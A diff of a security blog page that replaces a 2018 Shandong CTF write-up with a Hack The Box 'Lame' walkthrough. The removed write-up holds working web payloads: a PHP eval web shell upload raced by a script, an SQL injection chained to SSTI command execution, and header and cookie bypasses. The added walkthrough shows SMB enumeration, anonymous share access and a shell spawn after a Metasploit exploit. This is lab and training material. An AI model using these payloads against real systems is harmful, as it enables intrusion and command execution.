@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="2018山东省省赛(科来杯)WriteUp, LANVNAL&#39;S Blog">
+    <meta name="keywords" content="HTB靶机每周练习系列--Lame, LANVNAL&#39;S Blog">
     <meta name="description" content="WEB安全、渗透测试、代码审计、20届毕业本科生">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>2018山东省省赛(科来杯)WriteUp | LANVNAL&#39;S Blog</title>
+    <title>HTB靶机每周练习系列--Lame | LANVNAL&#39;S Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -329,12 +329,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/HTB/Hack-The-Box-logo.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">2018山东省省赛(科来杯)WriteUp</h1>
+                    <h1 class="description center-align post-title">HTB靶机每周练习系列--Lame</h1>
                 </div>
             </div>
         </div>
@@ -455,8 +455,12 @@
                                 <span class="chip bg-color">WriteUp</span>
                             </a>
                         
-                            <a href="/tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
+                            <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                <span class="chip bg-color">靶机</span>
+                            </a>
+                        
+                            <a href="/tags/HTB/">
+                                <span class="chip bg-color">HTB</span>
                             </a>
                         
                     </div>
@@ -467,8 +471,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF/" class="post-category">
-                                CTF
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                靶机
                             </a>
                         
                     </div>
@@ -480,21 +484,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2018-11-06
+                    2021-12-15
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-02-18
+                    2021-12-15
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    667
                 </div>
                 
 
@@ -511,195 +515,71 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>根据提示<code>“你的IP地址不在允许范围内“</code>，在请求头添加<code>X-Forwarded-For:127.0.0.1</code>，</p>
-<p>根据提示<code>“你不是管理员”</code>，修改cookie<code>admin</code>的值为1。</p>
-<p>得到flag。</p>
-<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>第一关给出了源码，考察的是变量覆盖+弱类型比较</p>
-<pre><code class="php">&lt;?php
+                <h1 id="HTB靶机每周练习系列–Lame"><a href="#HTB靶机每周练习系列–Lame" class="headerlink" title="HTB靶机每周练习系列–Lame"></a>HTB靶机每周练习系列–Lame</h1><p>目标ip：10.129.197.171</p>
+<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap扫描端口</p>
+<pre><code>➜ sudo nmap -sS -sV 10.129.197.171
+Password:
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-14 16:52 CST
+Nmap scan report for 10.129.197.171
+Host is up (0.44s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><h2 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h2><p>21端口开着，ftp存在匿名登陆但是没文件，去看一下这个 vsftpd 2.3.4 有没有漏洞</p>
+<p>exp-db搜索一下，发现存在命令执行，msf有可以用的payload，上msf</p>
+<p>不过很遗憾，exp打不成功，可能口子找错了</p>
+<h2 id="smb服务"><a href="#smb服务" class="headerlink" title="smb服务"></a>smb服务</h2><p>之前的扫描没有打印smb服务的详细版本，我们使用 nmap的NSE脚本来进行更详细的信息搜集</p>
+<pre><code>nmap --script smb-enum-shares.nse -p445 10.129.197.171</code></pre><p>不过这里没有扫出来，不知道啥原因</p>
+<p>用 <code>smbmap</code> 看一下smb有没有无需凭据即可访问的共享</p>
+<pre class=" language-bash"><code class="language-bash">└─$ smbmap -H 10.129.197.171
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: 10.129.197.171:445    Name: 10.129.197.171
+        Disk                                                      Permissions    Comment
+    ----                                                      -----------    -------
+    print$                                                NO ACCESS    Printer Drivers
+    tmp                                                   READ, WRITE    oh noes<span class="token operator">!</span>
+    opt                                                   NO ACCESS
+    IPC$                                                  NO ACCESS    IPC Service <span class="token punctuation">(</span>lame server <span class="token punctuation">(</span>Samba 3.0.20-Debian<span class="token punctuation">))</span>
+    ADMIN$                                                NO ACCESS    IPC Service <span class="token punctuation">(</span>lame server <span class="token punctuation">(</span>Samba 3.0.20-Debian<span class="token punctuation">))</span></code></pre>
+<p>同时也得到smb版本<br>使用 <code>smbclient</code> 连接上面的目录看看</p>
+<pre class=" language-bash"><code class="language-bash">└─$ smbclient -N //10.129.197.171/tmp                                                                                                                                                                                                                                                                                     1 ⨯
+protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED</code></pre>
+<p>有这个报错提示，原因是连接的是老版本的smb，安全设置的原因不能连接，通过如下参数就可以了</p>
+<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─$ smbclient -N //10.129.197.171/tmp --option<span class="token operator">=</span><span class="token string">'client min protocol=NT1'</span>                                                                                                                                                                                                                                                130 ⨯
+Anonymous login successful
+Try <span class="token string">"help"</span> to get a list of possible commands.
+smb: \<span class="token operator">></span> <span class="token function">dir</span>
+  <span class="token keyword">.</span>                                   D        0  Tue Dec 14 11:06:49 2021
+  <span class="token punctuation">..</span>                                 DR        0  Sat Oct 31 03:33:58 2020
+  orbit-makis                        DR        0  Tue Dec 14 06:25:32 2021
+  .ICE-unix                          DH        0  Tue Dec 14 03:31:26 2021
+  vmware-root                        DR        0  Tue Dec 14 03:32:31 2021
+  .X11-unix                          DH        0  Tue Dec 14 03:31:50 2021
+  gconfd-makis                       DR        0  Tue Dec 14 06:25:32 2021
+  .X0-lock                           HR       11  Tue Dec 14 03:31:50 2021
+  5565.jsvc_up                        R        0  Tue Dec 14 03:32:37 2021
+  vgauthsvclog.txt.0                  R     1600  Tue Dec 14 03:31:25 2021
 
-    include &#39;here.php&#39;;
-    $key = &#39;kelaibei&#39;;
-
-    if(isset($_GET[&#39;id&#39;]))&#123;
-        $id = $_GET[&#39;id&#39;];
-        @parse_str($id);
-        if ($key[99] != &#39;aabg7XSs&#39; &amp;&amp; md5($key[99]) == md5(&#39;aabg7XSs&#39;)) &#123;
-           echo $hint;
-        &#125;
-        else&#123;
-            echo &#39;try again&#39;;
-        &#125;
-    &#125;
-    else&#123;
-        show_source(__FILE__);
-    &#125;</code></pre>
-<p>payload：</p>
-<pre><code class="php">/?id=key[99]=314282422</code></pre>
-<p>第二关</p>
-<p>有一个表单，输入文件名和内容来创建文件并返回路径。但当我们去访问返回的文件路径时，内容变成了<code>too solw!</code>,能注意到submit之后有一个短暂的停顿时间才返回路径。</p>
-<p>它的逻辑是，上传后创建该文件，有一个1或2秒的sleep才返回路径，在sleep执行完后执行的应该是覆盖该文件内容的操作，也就是<code>too slow</code>，也就是说等我们发出的请求返回时，文件内容已经被覆盖了。在覆盖前访问到该文件就会返回flag，并不用执行命令。</p>
-<p><img src="/images/2018shengsai/web2.png"></p>
-<p>解题思路是：写个脚本不停的请求该文件。</p>
-<p>当时的脚本：</p>
-<pre><code class="python">import requests
-import threading
-S = requests.session()
-burp0_url = &quot;http://47.105.148.65:29002/upl04d50m3thing.php?filename=shell.php&amp;content=%3C%3Fphp+%40eval%28%24_POST%5B%27a%27%5D%29%3B+%3F%3E&quot;
-burp0_cookies = &#123;&quot;PHPSESSID&quot;: &quot;9f53c39f9d92b155eef84f566a85af1c&quot;, &quot;session&quot;: &quot;.eJwNj01rg0AQQP9KmbMHs91ehB5Sti6mzIhiCLO3fCzq6NhiG9oY8t_r_T0e7w7Hi_YTZD_zNSbQXyDbJDB9TucI2R2eTpABamXJtTduimeU_UKyNehroWX7ywZv5KoXlrcOpfgjX6VBWkOH3RD8fkHXWlIa-ZCPvKz-cjastZIbhSQXMkWKknfcBCUZLAnb0u-UZTClo5FcLaXPO9R6QGk32NQS_HvKioZ0bUi1coNlE_rg8RUeCVy_4zwddR2Aptf4EeNXnOHxDwKRTN0.DsLJEg.b1wYSUwY1h1HFFHsrhU-6zGDaCE&quot;, &quot;admin&quot;: &quot;0&quot;&#125;
-burp0_headers = &#123;&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;, &quot;Referer&quot;: &quot;http://47.105.148.65:29002/upl04d50m3thing.php?filename=shell.php&amp;content=aa&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;
-def up():
-    burp0_url = &quot;http://47.105.148.65:29002/upl04d50m3thing.php?filename=shell.php&amp;content=%3C%3Fphp+%40eval%28%24_POST%5B%27a%27%5D%29%3B+%3F%3E&quot;
-    a=S.get(burp0_url,headers=burp0_headers, cookies=burp0_cookies)
-
-def shell():
-            url2=&quot;http://47.105.148.65:29002/uploads/8af92ffefda7050707590b352dfb3cd2e03d29a6/shell.php&quot;
-    data=&#123;&#39;a&#39;:&#39;system(\&#39;pwd\&#39;);&#39;&#125;
-    b=S.get(url2,headers=burp0_headers, cookies=burp0_cookies,data=data)
-    print b.text
-
-for i in range(10):
-    a = threading.Thread(target=up)
-    b = threading.Thread(target=shell)
-    a.start()
-    b.start()
-
-for i in range(10):
-    a.join()
-    b.join()</code></pre>
-<p>当时以为要传shell执行命令来着。其实可以更简单的脚本，循环请求该文件，手动submit就ok了。</p>
-<pre><code class="python">import requests
-def up():
-    url = &quot;http://47.105.148.65:29002/uploads/635e1c31153cc410cb61e8997f7c0458fb72785f/shell.php&quot;
-    a=requests.get(burp0_url)
-    print a.text
-while(True):
-    up()
-###web页面手动提交就ok</code></pre>
-<h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p>search处存在注入，但flag不在数据库中，因为查询的结果在渲染时没处理直接进行渲染所以这里存在ssti。</p>
-<p>所以这是个注入和ssti的题目，通过union select控制查询结果实现ssti。</p>
-<pre><code class="php">http://47.105.148.65:29003/?username=%27union+select+1,%22&#123;&#123;config&#125;&#125;,3%20%23</code></pre>
-<p><img src="/images/2018shengsai/web3-1.png"></p>
-<p>没什么过滤的，执行命令输出flag。</p>
-<pre><code class="php">http://47.105.148.65:29003/?username=%27union+select+1,%22&#123;&#123;().__class__.__mro__[1].__subclasses__()[59].__init__.func_globals.linecache.os.popen('cat /flag').read()&#125;&#125;%22,3%20%23</code></pre>
-<p><img src="/images/2018shengsai/web3-1.png"></p>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><blockquote>
-<p>二进制、八进制、十进制、十六进制，你能分的清吗？</p>
-</blockquote>
-<p>附件：</p>
-<pre><code>d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e</code></pre>
-<p>写脚本匹配一下就ok：</p>
-<pre><code class="python">import re
-s=&quot;d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e&quot;
-s = s.split(&quot; &quot;)
-slen = len(s)
-for i in range(slen):
-    if re.match(&quot;d()&quot;,s[i]):
-        s[i] = s[i][1:]
-    elif re.match(&quot;x()&quot;,s[i]):
-        s[i] = int(s[i][1:],16)
-    elif re.match(&quot;o()&quot;,s[i]):
-        s[i] = int(s[i][1:],8)
-    elif re.match(&quot;b()&quot;,s[i]):
-        s[i] = int(s[i][1:],2)
-
-flag = &#39;&#39;
-for i in range(slen):
-    flag += chr(int(s[i]))
-print flag</code></pre>
-<h3 id="crack-it"><a href="#crack-it" class="headerlink" title="crack it"></a>crack it</h3><pre><code>flag:hellokitty</code></pre>
-<p><img src="/images/2018shengsai/crackit.png"></p>
-<h3 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h3><p>绘图，给了共135000行rgb值，长宽的话爆破一下135000的因子就有了。</p>
-<pre><code class="python">#-*- coding:utf-8-*-
-
-from PIL import Image
-
-file = open(&#39;basic.txt&#39;, &#39;r&#39;)
-
-x = 75    #因式分解135000
-y = 1800
-
-IM = Image.new(&quot;RGB&quot;, (x, y))
-
-for i in range(x):
-    for j in range(y):
-        line = file.readline()
-        e = line.strip().lstrip(&#39;(&#39;).rstrip(&#39;)&#39;) #去除左右括号
-        tmp = e.split(&#39;,&#39;)
-        #print tmp
-        IM.putpixel((i, j), (int(tmp[0]), int(tmp[1]), int(tmp[2])))
-
-IM.show(&#39;pic.png&#39;) #存储图片为pic</code></pre>
-<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>Wiener-attack</p>
-<p>Ctf-rsa-tools    一把梭</p>
-<pre><code>N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597
-e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619
-
-enc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</code></pre>
-<p><img src="/images/2018shengsai/rsa.png"></p>
-<h3 id="affine"><a href="#affine" class="headerlink" title="affine"></a>affine</h3><blockquote>
-<p>y = 17*x-8 </p>
-<p>flag{szzyfimhyzd}</p>
-</blockquote>
-<p>仿射加密</p>
-<pre><code class="python">def affine(a, b):
-    pwd = &#123;&#125;
-    for i in range(26):
-        pwd_dic[chr(((a*i+b)%26+97))] = chr(i+97)
-    return pwd_dic
-
-if __name__ == &#39;__main__&#39;:
-    pwd_dic = &#123;&#125;
-    pwd = &#39;szzyfimhyzd&#39;
-    plain = []
-    pwd_dic = affine(17, -8)
-    #print pwd_dic
-    for i in pwd:
-        plain.append(pwd_dic[i])
-    print &quot;Flag is : &quot; + &quot;&quot;.join(plain)
-</code></pre>
-<h3 id="神秘的代码"><a href="#神秘的代码" class="headerlink" title="神秘的代码"></a>神秘的代码</h3><p>xor+aes_ecb</p>
-<p>先异或两个info文件</p>
-<pre><code class="python">file1 = file(&#39;info_clear.txt&#39;,&#39;rb&#39;)
-file2 = file(&#39;info_crypt.txt&#39;,&#39;rb&#39;)
-f1 = file1.read()
-f2 = file2.read()
-out=&#39;&#39;
-for i in range(len(f1)):
-    out += chr(ord(f1[i])^ord(f2[i]))
-print out
-file1.close()
-file2.close()</code></pre>
-<p>得到如下信息：</p>
-<pre><code>i am a hydre agenT, coverly spying on the superHeroes. I am aware of the group that iS going to aTtack you...but Hydra has had its diffErences with you in the past, so i&#39;m not going to maKe it vEry simple for You ....ecb...aes(I Vouch for this: 12345)...md5(this)...base64...</code></pre>
-<p>将大写字母提取出来，是<code>THISTHEKEYIV</code>.但这并不是aes的key，key值是整段话的md5。（emmmm）</p>
-<pre><code class="python">import hashlib
-import base64
-from Crypto.Cipher import AES
-
-file1 = file(&#39;info_clear.txt&#39;,&#39;rb&#39;)
-file2 = file(&#39;info_crypt.txt&#39;,&#39;rb&#39;)
-file3 = file(&#39;true_crypto.txt&#39;,&#39;rb&#39;)
-f1 = file1.read()
-f2 = file2.read()
-f3 = base64.b64decode(file3.read())
-
-out=&#39;&#39;
-for i in range(len(f1)):
-    out += chr(ord(f1[i])^ord(f2[i]))
-key = hashlib.md5(out.rstrip(&#39;\n&#39;)).hexdigest()
-cipher = AES.new(key, AES.MODE_ECB)
-flag = cipher.decrypt(f3)
-print flag
-
-file1.close()
-file2.close()
-file3.close()
-
-#Congratulations, you got the real flag, the flag is - flag&#123;4eS_3Cb_Us3_mD5_key&#125;! :)</code></pre>
-<h2 id="Stego"><a href="#Stego" class="headerlink" title="Stego"></a>Stego</h2><h3 id="啊哒"><a href="#啊哒" class="headerlink" title="啊哒"></a>啊哒</h3><p>binwalk分离出个压缩包</p>
-<p>exif信息是一串十六进制，转成字符串是压缩包密码</p>
-<p>解压得到flag</p>
-<h3 id="神秘的文件"><a href="#神秘的文件" class="headerlink" title="神秘的文件"></a>神秘的文件</h3><p>明文攻击</p>
+        7282168 blocks of size 1024. 5385180 blocks available</code></pre>
+<p>没有有用的文件，那就是smb的洞了，毕竟也是很老的版本了</p>
+<p>搜索expdb得知存在rce，msf启动～～</p>
+<h2 id="攻击smb，获取shell"><a href="#攻击smb，获取shell" class="headerlink" title="攻击smb，获取shell"></a>攻击smb，获取shell</h2><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/HTB/Lame/16394989002704.jpg" alt="msf"></p>
+<p>获取到user flag</p>
+<pre class=" language-bash"><code class="language-bash">python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
+root@lame:/home<span class="token comment" spellcheck="true"># ls</span>
+<span class="token function">ls</span>
+<span class="token function">ftp</span>  makis  <span class="token function">service</span>  user
+root@lame:/home<span class="token comment" spellcheck="true"># ls makis</span>
+<span class="token function">ls</span> makis
+user.txt
+root@lame:/home<span class="token comment" spellcheck="true"># cat makis/user.txt</span>
+<span class="token function">cat</span> makis/user.txt
+848890f49b5bd224150c98682a7e8ec3</code></pre>
+<p>root的也一并拿了<br><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/HTB/Lame/16394992152056.jpg" alt="flag"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比之前的要简单不少，下一个靶机开始打中等的了</p>
 
             </div>
             <hr/>
@@ -725,7 +605,7 @@ file3.close()
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://lanvnal.com/2018/11/06/2018-shan-dong-sheng-sheng-sai-ke-lai-bei-writeup/">https://lanvnal.com/2018/11/06/2018-shan-dong-sheng-sheng-sai-ke-lai-bei-writeup/</a>
+                    <a href="https://lanvnal.com/2021/12/15/htb-ba-ji-mei-zhou-lian-xi-xi-lie-lame/">https://lanvnal.com/2021/12/15/htb-ba-ji-mei-zhou-lian-xi-xi-lie-lame/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -767,8 +647,12 @@ file3.close()
                                     <span class="chip bg-color">WriteUp</span>
                                 </a>
                             
-                                <a href="/tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
+                                <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                                    <span class="chip bg-color">靶机</span>
+                                </a>
+                            
+                                <a href="/tags/HTB/">
+                                    <span class="chip bg-color">HTB</span>
                                 </a>
                             
                         </div>
@@ -810,41 +694,42 @@ file3.close()
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2018/11/12/hctf-web-de-bu-fen-wp/">
+                <a href="/2021/12/15/htb-ba-ji-mei-zhou-lian-xi-xi-lie-lame/">
                     <div class="card-image">
                         
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/HTB/Hack-The-Box-logo.png" class="responsive-img" alt="HTB靶机每周练习系列--Lame">
                         
-                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/3.jpg" class="responsive-img" alt="HCTF-Web的部分WP">
-                        
-                        <span class="card-title">HCTF-Web的部分WP</span>
+                        <span class="card-title">HTB靶机每周练习系列--Lame</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            HTB靶机每周练习系列的文章记录，本文包含一个easy靶机（Lame）,下周开始打Medium
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2018-11-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                    靶机
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -852,8 +737,12 @@ file3.close()
                         <span class="chip bg-color">WriteUp</span>
                     </a>
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">靶机</span>
+                    </a>
+                    
+                    <a href="/tags/HTB/">
+                        <span class="chip bg-color">HTB</span>
                     </a>
                     
                 </div>
@@ -867,31 +756,30 @@ file3.close()
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2018/07/28/rsa-ti-xing-zong-jie/">
+                <a href="/2021/12/08/esxi7-an-zhuang-hei-qun-hui-dsm7/">
                     <div class="card-image">
                         
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/ESXI-install-DSM7/dsm7.png" class="responsive-img" alt="ESXI安装黑群晖DSM7">
                         
-                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/2.jpg" class="responsive-img" alt="RSA题型总结（2018-8-5更新）">
-                        
-                        <span class="card-title">RSA题型总结（2018-8-5更新）</span>
+                        <span class="card-title">ESXI安装黑群晖DSM7</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            
+                            群里的同志们一直都有文件存储分享的需求，正好实验室一批服务器到位了，装个黑裙来“爽”一下，记录一下安装过程和踩的坑，不得不说性能比我的220+好多了
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2018-07-28
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-08
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/note/" class="post-category">
-                                    note
+                            <a href="/categories/other/" class="post-category">
+                                    other
                                 </a>
                             
                             
@@ -901,12 +789,12 @@ file3.close()
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/note/">
-                        <span class="chip bg-color">note</span>
+                    <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/">
+                        <span class="chip bg-color">服务器</span>
                     </a>
                     
-                    <a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86/">
-                        <span class="chip bg-color">加解密</span>
+                    <a href="/tags/%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95/">
+                        <span class="chip bg-color">踩坑记录</span>
                     </a>
                     
                 </div>
